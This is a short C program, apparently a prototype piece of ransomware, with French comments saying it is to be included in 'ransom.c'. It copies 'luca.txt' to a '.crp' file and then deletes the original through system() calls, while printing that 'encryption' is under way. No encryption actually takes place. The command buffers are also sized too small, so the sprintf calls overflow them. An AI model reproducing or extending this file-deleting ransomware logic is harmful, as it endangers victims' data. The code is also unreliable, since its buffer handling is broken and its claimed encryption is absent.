#include <stdio.h>
#include <dirent.h> 
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>


int main ()
{
    char filename[] = "luca.txt";
    int system(const char* command);

    printf("BIP BOUP , encryption en cours de %s\n",filename);
    printf("------------------------------------- \n");

    int strl_file = strlen(filename);
    int l_cp = (sizeof(char)*6) + ((sizeof(char)*strl_file)*2) ;
    int l_rm = (sizeof(char)*2) + (sizeof(char)*strl_file);

    char buf_cp[l_cp];
    char buf_rm[l_rm];

    sprintf(buf_cp,"cp %s %s.crp",filename,filename);
    sprintf(buf_rm,"rm %s",filename);

    
    system(buf_cp);
    system("ls \n");
    printf("-------------------------------------\n ");
    system(buf_rm);
    system("ls \n");
    printf("-------------------------------------\n ");
    

    //verification avant suppr
    //inclure dans ransom.c

}
